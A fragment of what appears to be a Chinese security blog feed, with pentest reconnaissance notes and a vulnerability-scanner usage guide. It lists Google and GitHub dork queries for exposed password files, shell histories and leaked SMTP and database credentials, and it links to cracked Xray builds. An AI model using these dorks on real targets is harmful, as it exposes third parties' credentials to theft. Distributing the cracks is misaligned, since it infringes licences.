class="regexp">/admin/</span></span><br><span class="line"><span class="string">Disallow:</span> <span class="regexp">/manager/</span><span class="string">Allow:</span><span class="regexp">/images/</span></span><br></pre></td></tr></table></figure><p>其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/ 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。</p><p>虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。</p><p>(2) .SVN泄露</p><p>(3) .DS_Stroe文件泄露</p><p>(4) .hg源码泄露</p><h4 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h4><h4 id><a href="#" class="headerlink" title></a></h4><h4 id="Google语法"><a href="#Google语法" class="headerlink" title="Google语法"></a>Google语法</h4><p>地址</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247483847&amp;idx=1&amp;sn=de67435015780fab4dd5832d7f1b4930&amp;chksm=eaad81faddda08ec8ed5ae134a0ecf466474ce67163212386808fb19d0471f23e3bdf7514fce&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&amp;mid=2247483847&amp;idx=1&amp;sn=de67435015780fab4dd5832d7f1b4930&amp;chksm=eaad81faddda08ec8ed5ae134a0ecf466474ce67163212386808fb19d0471f23e3bdf7514fce&amp;scene=21#wechat_redirect</a></p><p>intext:</p><p>寻找正文中含有关键字的网页，例如：<strong>intext:后台登录</strong>  将只返回正文中包含 后台登录 的网页</p><p>intitle:</p><p>寻找标题中含有关键字的网页，例如：<strong>intitle:后台登录</strong>  将只返回标题中包含 后台登录 的网页，<strong>intitle:后台登录 密码</strong> 将返回标题中包含黑客而正文中包含中国的网页</p><p>allintitle:</p><p>用法和intitle类似，只不过可以指定多个词，例如： <strong>alltitle:后台登录 管理员</strong>  将返回标题中包含后台登录 和管理员的网页</p><p><strong>inurl：</strong></p><p>将返回url中含有关键词的网页：例如：<strong>inurl:Login</strong>  将返回url中含有 Login 的网页，查找管理员登录页面inurl:/admin/login，查找数据库管理页面inurl:/phpmyadmin/index.php</p><p><strong>allinurl:</strong></p><p>用法和inurl类似，只不过可以指定多个词，例如：<strong>inurl:Login admin</strong> 将返回url中含有 Login 和 admin 的网页</p><p><strong>site:</strong></p><p>指定访问的站点，例如： <strong>site:baidu.com inurl:Login</strong>  将只在baidu.com 中查找url中含有 Login的网页</p><p><strong>filetype:</strong></p><p>指定访问的文件类型，例如：<strong>site:baidu.com filetype:pdf</strong>   将只返回baidu.com站点上文件类型为pdf的网页</p><p><strong>link:</strong></p><p>指定链接的网页，例如：<strong>link:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></strong>  将返回所有包含指向 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 的网页</p><p><strong>related:</strong></p><p>相似类型的网页，例如：<strong>related:<a href="http://www.xjtu.edu.cn" target="_blank" rel="noopener">www.xjtu.edu.cn</a></strong> 将返回与 <a href="http://www.xjtu.edu.cn" target="_blank" rel="noopener">www.xjtu.edu.cn</a> 相似的页面，相似指的是网页的布局相似</p><p><strong>cache:</strong></p><p>网页快照，谷歌将返回给你他存储下来的历史页面，如果你同时制定了其他查询词，将在搜索结果里以高亮显示，例如：<strong>cache:<a href="http://www.hackingspirits.com" target="_blank" rel="noopener">www.hackingspirits.com</a> guest</strong> ，将返回指定网站的缓存，并且正文中含有guest</p><p><strong>info:</strong></p><p>返回站点的指定信息，例如：<strong>info:<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></strong>  将返回百度的一些信息</p><p><strong>define:</strong></p><p>返回某个词语的定义，例如：<strong>define:Hacker</strong>　　将返回关于Hacker的定义</p><p><strong>phonebook:</strong></p><p>电话簿查询美国街道地址和电话号码信息。例如：<strong>phonebook:Lisa+CA</strong> 将返回名字里面包含Lisa并住在加州的人的所有名字</p><p><strong>查找网站后台</strong></p><p>· site:xx.com intext:管理</p><p>· site:xx.com inurl:login</p><p>· site:xx.com intitle:后台</p><p><strong>查看服务器使用的程序</strong></p><p>· site:xx.com filetype:asp</p><p>· site:xx.com filetype:php</p><p>· site:xx.com filetype:jsp</p><p>· site:xx.com filetype:aspx</p><p><strong>查看上传漏洞</strong></p><p>· site:xx.com inurl:file</p><p>· site:xx.com inurl:load</p><p><strong>Index of</strong></p><p>利用 Index of  语法去发现允许目录浏览的web网站，就像在本地的普通目录一样。下面是一些有趣的查询：</p><p>· index of /admin</p><p>· index of /passwd</p><p>· index of /password</p><p>· index of /mail</p><p>· “index of /“ +passwd</p><p>· “index of /“ +password.txt</p><p>· “index of /“ +.htaccess</p><p>· “index of /root”</p><p>· “index of /cgi-bin”</p><p>· “index of /logs”</p><p>· “index of /config”</p><p><strong>inurl</strong></p><p>而上面这些命令中用的最多的就是 inurl: 了，利用这个命令，可以查到很多意想不到的东西</p><p>· 利用 allinurl:winnt/system32/ 查询：列出的服务器上本来应该受限制的诸如“system32” 等目录，如果你运气足够好，你会发现“system32” 目录里的“cmd.exe” 文件，并能执行他，接下来就是提升权限并攻克了。</p><p>· 查询 allinurl:wwwboard/passwd.txt  将列出所有有“WWWBoard Password vulnerability”漏洞的服务器，阅读更多请参见下面链接。</p><p>· 查询 inurl:.bash_history  将列出互联网上可以看见 “inurl:.bash_history” 文件的服务器。这是一个命令历史文件，这个文件包含了管理员执行的命令，有时会包含一些敏感信息比如管理员键入的密码。</p><p>· 查询 inurl:config.txt  将看见网上暴露了“inurl:config.txt”文件的服务器，这个文件包含了经过哈希编码的管理员的密码和数据库存取的关键信息。</p><p>还有一些其他一些使用“inurl:”和“allinurl:”查询组合的例子</p><p>· inurl:admin filetype:txt</p><p>· inurl:admin filetype:db</p><p>· inurl:admin filetype:cfg</p><p>· inurl:mysql filetype:cfg</p><p>· inurl:passwd filetype:txt</p><p>· inurl:”wwwroot/*.”</p><p>· inurl:adpassword.txt</p><p>· inurl:webeditor.php</p><p>· inurl:file_upload.php</p><p>· inurl:gov filetype:xls “restricted”</p><p>· index of ftp +.mdb allinurl:/cgi-bin/ +mailto</p><p>site:*.tw intext:网页底部模版信息</p><p>利用该方法需要一定的经验积累，以下是针定特定目标的信息收集思路。例如：对于不同的业务系统，得想出不同的联想词，例如商城系统，联想词可以为商家系统，对于大型的企业，OA登录、CRM等等的联想词。</p><blockquote><p>后台：site:xxx.xxx admin|login|system|管理|登录|内部|系统</p><p>钓鱼：site:xxx.xxx 邮件|email</p><p>社工：site:xxx.xxx qq|群|微信|腾讯</p><p>越权：site:xxx.xxx inurl:uid=1|userid=1</p><p>包含：site:xxx.xxx inurl:php?include=</p></blockquote><h4 id="github信息泄露"><a href="#github信息泄露" class="headerlink" title="github信息泄露"></a>github信息泄露</h4><p>Github的搜素语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">in</span>:name <span class="built_in">test</span>               <span class="comment">#仓库标题搜索含有关键字 SpringCloud</span></span><br><span class="line"><span class="keyword">in</span>:descripton <span class="built_in">test</span>         <span class="comment">#仓库描述搜索含有关键字</span></span><br><span class="line"><span class="keyword">in</span>:readme <span class="built_in">test</span>             <span class="comment">#Readme文件搜素含有关键字</span></span><br><span class="line">stars:&gt;3000 <span class="built_in">test</span>           <span class="comment">#stars数量大于3000的搜索关键字</span></span><br><span class="line">stars:1000..3000 <span class="built_in">test</span>      <span class="comment">#stars数量大于1000小于3000的搜索关键字</span></span><br><span class="line">forks:&gt;1000 <span class="built_in">test</span>           <span class="comment">#forks数量大于1000的搜索关键字</span></span><br><span class="line">forks:1000..3000 <span class="built_in">test</span>      <span class="comment">#forks数量大于1000小于3000的搜索关键字</span></span><br><span class="line">size:&gt;=5000 <span class="built_in">test</span>           <span class="comment">#指定仓库大于5000k(5M)的搜索关键字</span></span><br><span class="line">pushed:&gt;2019-02-12 <span class="built_in">test</span>    <span class="comment">#发布时间大于2019-02-12的搜索关键字</span></span><br><span class="line">created:&gt;2019-02-12 <span class="built_in">test</span>   <span class="comment">#创建时间大于2019-02-12的搜索关键字</span></span><br><span class="line">user:<span class="built_in">test</span>                  <span class="comment">#用户名搜素</span></span><br><span class="line">license:apache-2.0 <span class="built_in">test</span>    <span class="comment">#明确仓库的 LICENSE 搜索关键字</span></span><br><span class="line">language:java <span class="built_in">test</span>         <span class="comment">#在java语言的代码中搜索关键字</span></span><br><span class="line">user:<span class="built_in">test</span> <span class="keyword">in</span>:name <span class="built_in">test</span>     <span class="comment">#组合搜索,用户名test的标题含有test的</span></span><br></pre></td></tr></table></figure><p>使用 Github 进行邮件配置信息收集</p><p>很多网站及系统都会使用 pop3 和 smtp 发送来邮件，不少开发者由于安全意识不足会把相关的配置信息也放到Github上，所以如果这时候我们动用一下google搜索命令语句，构造一下关键字，就能把这些信息给找出来了。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">site</span>:Github.com smtp</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp <span class="variable">@qq</span>.com</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp <span class="variable">@126</span>.com</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp <span class="variable">@163</span>.com</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp <span class="variable">@sina</span>.com.cn</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp password</span><br><span class="line"><span class="attribute">site</span>:Github.com String password smtp</span><br><span class="line">我们也可以锁定域名搜索结合厂商域名 灵活运用例如搜百度的</span><br><span class="line"><span class="attribute">site</span>:Github.com smtp <span class="variable">@baidu</span>.com</span><br></pre></td></tr></table></figure><p>使用Github进行数据库信息收集</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:Github.com sa password</span><br><span class="line">site:Github.com root password</span><br><span class="line">site:Github.com<span class="built_in"> User </span><span class="attribute">ID</span>=’sa’;Password</span><br><span class="line">site:Github.com inurl:sql</span><br></pre></td></tr></table></figure><p>使用Github进行 SVN 信息收集</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:Github<span class="selector-class">.com</span> svn</span><br><span class="line">site:Github<span class="selector-class">.com</span> svn username</span><br><span class="line">site:Github<span class="selector-class">.com</span> svn password</span><br><span class="line">site:Github<span class="selector-class">.com</span> svn username password</span><br></pre></td></tr></table></figure><p>使用Github进行综合信息收集</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">site:Github<span class="selector-class">.com</span> password</span><br><span class="line">site:Github<span class="selector-class">.com</span> ftp ftppassword</span><br><span class="line">site:Github<span class="selector-class">.com</span> 密码</span><br><span class="line">site:Github<span class="selector-class">.com</span> 内部</span><br></pre></td></tr></table></figure><p>github工具</p><p>gsil git-all-secret gitminer</p><p><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a></p><h4 id="网站信息泄露"><a href="#网站信息泄露" class="headerlink" title="网站信息泄露"></a>网站信息泄露</h4><p>Robots.txt</p><p>敏感文件扫描</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/6-2.png" alt="img"></p><p>meta tag</p><p>Tag位于每个 HTML 文档的 HEAD 部分, 并且应该在一个 web 站点上的下述事件中保持一致：机器人/蜘蛛/爬虫的起始点不是从 webroot 以外的文档链接开始的。</p><p>网络蜘蛛/机器人/爬虫可以故意忽略 “<meta name="ROBOTS">” tag。</p><p><strong>工具</strong>: BurpSuite</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/7-2.png" alt="img"></p><h4 id="审查网页评论和信息泄露的元数据"><a href="#审查网页评论和信息泄露的元数据" class="headerlink" title="审查网页评论和信息泄露的元数据"></a>审查网页评论和信息泄露的元数据</h4><p>对于程序员来说, 在源代码中添加详细注释和元数据是非常普遍的,甚至是推荐的。但是, HTML 代码中包含的注释和元数据可能会对潜在攻击者暴露内部信息。应对源代码中的注释和元数据进行审查以确定是否泄露了任何信息。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/10-2.png" alt="img"></p><h4 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h4><ul><li>确认并记下任何header<img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/15.png" alt="img"></li><li>确认哪里有重定向(300 HTTP 状态代码)，400 状态代码, 403 禁用和500内部服务器错误。</li></ul><p>一些注意事项:</p><ul><li><p>为了发现隐藏的参数, 可以使用Burpsuit的以下选项:</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/11-2.png" alt="img"></p></li></ul><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/12-2.png" alt="img"></p><ul><li><p>使用Burpsuite 和状态代码来查找它们</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/03/13-2.png" alt="img"></p></li></ul><p>Javascript信息收集</p><p>burpsuite插件</p><p>F12查看js文件或者查看资源模块（Resource）查看可利用的js文件，比如conf.js，里面可能会涉及到一些暗藏的链接等敏感信息</p><p>webserver信息收集</p><p>通过火狐浏览器的查看元素方法，查找信息。</p><p> <img src="https://img2018.cnblogs.com/blog/1474078/201902/1474078-20190220215432870-1910572151.png" alt="img"></p><h3 id="社工信息收集"><a href="#社工信息收集" class="headerlink" title="社工信息收集"></a>社工信息收集</h3><h4 id="员工信息收集"><a href="#员工信息收集" class="headerlink" title="员工信息收集"></a>员工信息收集</h4><p>image-20201112162745573.png</p><h4 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h4><h1 id="SimplyEmail"><a href="#SimplyEmail" class="headerlink" title="SimplyEmail"></a>SimplyEmail</h1><p><a href="https://github.com/SimplySecurity/SimplyEmail/archive/master.zip" target="_blank" rel="noopener">https://github.com/SimplySecurity/SimplyEmail/archive/master.zip</a></p><p>20201112163818486.png</p><p>注意密码次数</p><p>20201112163959472.png</p><h4 id="字典创建"><a href="#字典创建" class="headerlink" title="字典创建"></a>字典创建</h4><h4 id="TG机器人"><a href="#TG机器人" class="headerlink" title="TG机器人"></a>TG机器人</h4><h3 id="其他信息收集"><a href="#其他信息收集" class="headerlink" title="其他信息收集"></a>其他信息收集</h3><p>重要</p><p>App</p><p>微信小程序</p><p>微信公众号</p><p>天眼查，企查查，企信宝</p><p>微博，抖音</p><p>根据找到的信息再做信息收集发现</p><p>20201112170533441.png</p><p>参考</p><p><a href="https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md</a></p><p><a href="https://github.com/Mr-xn/Penetration_Testing_POC" target="_blank" rel="noopener">https://github.com/Mr-xn/Penetration_Testing_POC</a></p><p><a href="https://github.com/k8gege/K8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></p><p>Tomcat 弱口令扫描器</p><p><a href="https://github.com/magicming200/tomcat-weak-password-scanner" target="_blank" rel="noopener">https://github.com/magicming200/tomcat-weak-password-scanner</a></p><p>根据nmap脚本解析 自动扫描器</p><p><a href="https://github.com/x90skysn3k/brutespray" target="_blank" rel="noopener">https://github.com/x90skysn3k/brutespray</a></p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201126154447928.png" alt="image-20201126154447928"></p><p>字典文件。pmaowu</p><p><a href="https://github.com/pmiaowu/PmWebDirScan/tree/master/dict" target="_blank" rel="noopener">https://github.com/pmiaowu/PmWebDirScan/tree/master/dict</a></p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/fuzzDicts</a></p><p>k8字典。 gituhub搜索</p><p>日本大神 字典</p><p><a href="https://github.com/TuuuNya/fuzz_dict" target="_blank" rel="noopener">https://github.com/TuuuNya/fuzz_dict</a></p><p>子域名</p><p><a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll</a></p><p><a href="https://github.com/lijiejie/subDomainsBrute/" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute/</a></p><p>子域名监控工具</p><p><a href="https://github.com/yassineaboukir/sublert" target="_blank" rel="noopener">https://github.com/yassineaboukir/sublert</a></p><p>搭建参考</p><p><a href="https://www.sohu.com/a/303652848_120055360" target="_blank" rel="noopener">https://www.sohu.com/a/303652848_120055360</a></p><p>护网自动化利用脚本github</p><p><a href="https://github.com/0x9f99/Recon" target="_blank" rel="noopener">https://github.com/0x9f99/Recon</a></p><p>子域名工具</p><p><a href="https://github.com/projectdiscovery/subfinder/" target="_blank" rel="noopener">https://github.com/projectdiscovery/subfinder/</a></p><p>自动化工具</p><p><a href="https://github.com/broken5/WebAliveScan" target="_blank" rel="noopener">https://github.com/broken5/WebAliveScan</a></p><p>外网信息收集</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203164957124.png" alt="image-20201203164957124"></p><p>几款子域名工具比较</p><p>xray5691条</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203192520442.png" alt="image-20201203192520442"></p><p>sublist3r含爆破功能1757</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203193158788.png" alt="image-20201203193158788"></p><p>subDomainsBrute   423个</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203192733600.png" alt="image-20201203192733600"></p><p>oneforall  56147</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203193445675.png" alt="image-20201203193445675"></p><p>去除重复项后。28069  因为http和https</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203194614115.png" alt="image-20201203194614115"></p><p>指纹</p><p><img src="//choge.top/2020/11/01/外网信息收集/image-20201203213257482.png" alt="image-20201203213257482"></p><p>子域名</p><p><a href="https://github.com/projectdiscovery/subfinder/" target="_blank" rel="noopener">https://github.com/projectdiscovery/subfinder/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;渗透的本质是信息收集&lt;/p&gt;&lt;p&gt;信息收集越全，攻击面就越广，拿下目标的可能性就越大&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/YNp8uKlSSS4be1cOeIIKxQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/YNp8uKlSSS4be1cOeIIKxQ&lt;/a&gt;&lt;/p&gt;&lt;h3 id=&quot;资产发现&quot;&gt;&lt;a href=&quot;#资产发现&quot; class=&quot;headerlink&quot; title=&quot;资产发现&quot;&gt;&lt;/a&gt;资产发现&lt;/h3&gt;&lt;h4 id=&quot;开源情报&quot;&gt;&lt;a href=&quot;#开源情报&quot; class=&quot;headerlink&quot; title=&quot;开源情报&quot;&gt;&lt;/a&gt;开源情报&lt;/h4&gt;&lt;h4 id=&quot;whois信息查询&quot;&gt;&lt;a href=&quot;#whois信息查询&quot; class=&quot;headerlink&quot; title=&quot;whois信息查询&quot;&gt;&lt;/a&gt;whois信息查询&lt;/h4&gt;&lt;h4 id=&quot;查找真实IP&quot;&gt;&lt;a href=&quot;#查找真实IP&quot; class=&quot;headerlink&quot; title=&quot;查找真实IP&quot;&gt;&lt;/a&gt;查找真实IP&lt;/h4&gt;&lt;p&gt;ping测试网站&lt;/p&gt;&lt;p&gt;· &lt;a href=&quot;https://wepcc.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://wepcc.com/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;· &lt;a href=&quot;http://ping.chinaz.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://ping.chinaz.com/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>主流漏洞扫描器使用</title>
    <link href="https://choge.top/2020/10/28/%E4%B8%BB%E6%B5%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8%E4%BD%BF%E7%94%A8/"/>
    <id>https://choge.top/2020/10/28/主流漏洞扫描器使用/</id>
    <published>2020-10-28T02:40:31.000Z</published>
    <updated>2021-02-22T09:21:39.862Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要总结下各类主流扫描器使用，包含Nessus，AWVS，Appscan，Burpsuite，Xray，Goby等</p><p>本文测试网站为<a href="http://testphp.vulnweb.com/" target="_blank" rel="noopener">http://testphp.vulnweb.com/</a></p><h3 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h3><p>AWVS使用docker镜像安装如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  pull 拉取下载镜像</span></span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"><span class="comment">#  将Docker的3443端口映射到物理机的 13443端口</span></span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"><span class="comment"># 容器的相关信息</span></span><br><span class="line">awvs13 username: admin@admin.com</span><br><span class="line">awvs13 password: Admin123</span><br><span class="line">AWVS版本：13.0.200217097</span><br></pre></td></tr></table></figure><a id="more"></a><p>扫描结果如下</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201030122336380.png" alt="image-20201030122336380"></p><h3 id="Appscan"><a href="#Appscan" class="headerlink" title="Appscan"></a>Appscan</h3><p>扫描结果</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031161243870.png" alt="image-20201031161243870"></p><p>漏洞扫描能力对比Burpsuite</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031162612509.png" alt="image-20201031162612509"></p><h3 id="xray"><a href="#xray" class="headerlink" title="xray"></a>xray</h3><h4 id="破解程序参考如下"><a href="#破解程序参考如下" class="headerlink" title="破解程序参考如下"></a>破解程序参考如下</h4><p><a href="https://github.com/zu1k/xray-crack" target="_blank" rel="noopener">https://github.com/zu1k/xray-crack</a></p><p><a href="https://github.com/Lz1y/xray-crack/releases/tag/v1.0" target="_blank" rel="noopener">https://github.com/Lz1y/xray-crack/releases/tag/v1.0</a></p><p><a href="https://harvey-blog.com/Safety/1610" target="_blank" rel="noopener">https://harvey-blog.com/Safety/1610</a></p><h4 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h4><h5 id="基础爬虫模式"><a href="#基础爬虫模式" class="headerlink" title="基础爬虫模式"></a>基础爬虫模式</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray_darwin_amd64 webscan --basic-crawler http://testphp.vulnweb.com --html-output 1.html</span><br></pre></td></tr></table></figure><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201030121930377.png" alt="image-20201030121930377"></p><p>查看xray官方服务扫描文档如下</p><p>参数配置目前比较简单，输入支持两种方式，例如:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">快速检测单个目标</span><br><span class="line">./xray servicescan --<span class="keyword">target</span> <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8009</span></span><br><span class="line"></span><br><span class="line">批量检查的 <span class="number">1</span>.<span class="keyword">file</span> 中的目标, 一行一个目标，带端口</span><br><span class="line">./xray servicescan --<span class="keyword">target</span>-<span class="keyword">file</span> <span class="number">1</span>.<span class="keyword">file</span> </span><br><span class="line">CopyErrorCopied</span><br></pre></td></tr></table></figure><p>其中 1.file 的格式为一个行一个 service，如</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10<span class="selector-class">.3</span><span class="selector-class">.0</span><span class="selector-class">.203</span><span class="selector-pseudo">:8009</span></span><br><span class="line">127<span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.1</span><span class="selector-pseudo">:8009CopyErrorCopied</span></span><br></pre></td></tr></table></figure><p>也可以将结果输出到报告或json文件中</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将检测结果输出到 html 报告中</span><br><span class="line"><span class="string">./xray</span> servicescan <span class="params">--target</span> 127.0.0.1<span class="function">:8009</span> <span class="params">--html-output</span> service.html</span><br><span class="line"><span class="string">./xray</span> servicescan <span class="params">--target-file</span> 1.file <span class="params">--html-output</span> service.html</span><br><span class="line"></span><br><span class="line">将检测结果输出到 json 文件中</span><br><span class="line"><span class="string">./xray</span> servicescan <span class="params">--target</span> 127.0.0.1<span class="function">:8099</span> <span class="params">--json-output</span> 1.json</span><br></pre></td></tr></table></figure><p>批量检查的 1.file 中的目标, 一行一个目标，带端口 ./xray servicescan –target-file 1.file </p><p>只需要将上述servicescan替换成webscan即批量扫描漏洞。</p><p>批量扫描漏洞结果如下</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20210222172134907.png" alt="image-20210222172134907">s</p><h3 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h3><p>扫描如下，goby使用过程中感觉适合做内网探测</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201030110314638.png" alt="image-20201030110314638"></p><h3 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h3><p>扫描方式如下Crawl and audit为爬虫和审计</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201030114119995.png" alt="image-20201030114119995"></p><p>结果如下</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201030122154308.png" alt="image-20201030122154308"></p><h3 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h3><h4 id="Kali安装nessus"><a href="#Kali安装nessus" class="headerlink" title="Kali安装nessus"></a>Kali安装nessus</h4><p>官网下载如下版本</p><p>Nessus-8.12.0-debian6_amd64.deb</p><p>安装过程中选择如下</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031182217121.png" alt="image-20201031182217121"></p><p>继续选择如下选项</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031182309966.png" alt="image-20201031182309966"></p><p>填入账户密码，一般账户密码都设置为Nessus</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031182346493.png" alt="image-20201031182346493"></p><p><code>/opt/nessus/sbin/nessuscli fetch --challenge</code>获取Challenge code</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031190040607.png" alt="image-20201031190040607"></p><p><a href="https://zh-cn.tenable.com/products/nessus/nessus-essentials中输入邮箱和姓名，为了活着发到邮箱的激活码" target="_blank" rel="noopener">https://zh-cn.tenable.com/products/nessus/nessus-essentials中输入邮箱和姓名，为了活着发到邮箱的激活码</a></p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031190321722.png" alt="image-20201031190321722"></p><p><a href="https://plugins.nessus.org/v2/offline.php中输入之前获得的Challenge" target="_blank" rel="noopener">https://plugins.nessus.org/v2/offline.php中输入之前获得的Challenge</a> code和邮箱code  <img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031190726099.png" alt="image-20201031190726099"></p><p>之后得到最新插件下载地址</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031192257204.png" alt="image-20201031192257204"></p><p>获取nessus.license</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031192326221.png" alt="image-20201031192326221"></p><p>回到kali安装最新插件和nessus.license</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>nessus<span class="regexp">/sbin/</span>nessuscli update all-<span class="number">2.0</span>.tar.gz</span><br><span class="line"><span class="regexp">/opt/</span>nessus<span class="regexp">/sbin/</span>nessuscli fetch --register-offline nessus.license</span><br></pre></td></tr></table></figure><p>需要记录下版本的日期如下版本为20201019163</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031221426777.png" alt="image-20201031221426777"></p><p><code>service nessusd restart</code>  会重新编译</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031221505125.png" alt="image-20201031221505125"></p><p>此还是限制使用16个ip</p><p><img src="//choge.top/2020/10/28/主流漏洞扫描器使用/image-20201031224452826.png" 